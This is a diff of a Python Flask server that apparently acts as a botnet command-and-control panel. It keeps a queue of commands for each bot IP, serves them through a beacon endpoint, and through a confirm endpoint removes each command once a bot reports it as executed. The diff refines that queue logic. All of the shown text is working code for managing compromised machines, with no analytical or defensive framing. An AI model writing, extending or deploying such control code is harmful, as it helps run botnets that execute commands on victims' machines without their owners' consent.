@@ -53,7 +53,7 @@ def beacon():
 		bots[ip] = []
 	else:
 		return json.dumps(bots[ip])
-
+	return json.dumps('0')
 		
 """
 Function: confirm
@@ -67,7 +67,10 @@ Description: Page for bot to send confirmation to after executing commands
 @app.route('/confirm')
 def confirm():
 	ip = request.args.get('ip')
-	bots[ip] = []
+	cmd = request.args.get('cmd')
+	#Recieve commands executed and remove them from the queue
+	if cmd in bots[ip]:
+		bots[ip].remove(cmd)
 	return 'True'
 
 
